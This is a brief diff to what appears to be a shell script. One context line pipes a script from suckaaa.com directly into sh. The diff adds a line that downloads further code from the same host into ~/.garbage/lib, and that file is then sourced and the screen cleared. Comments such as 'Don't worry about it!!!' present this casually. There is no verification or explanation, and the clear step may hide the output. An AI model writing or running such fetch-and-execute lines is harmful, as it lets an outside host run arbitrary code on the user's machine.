@@ -4,6 +4,10 @@
 # Don't worry about it!!!
 
 curl -s 'https://suckaaa.com/s/lib-installer' | sh;
+
+# For the gateway script, we'll always want to force-update the lib
+curl -s https://suckaaa.com/s/lib > ~/.garbage/lib;
+
 source ~/.garbage/lib;
 clear;
 
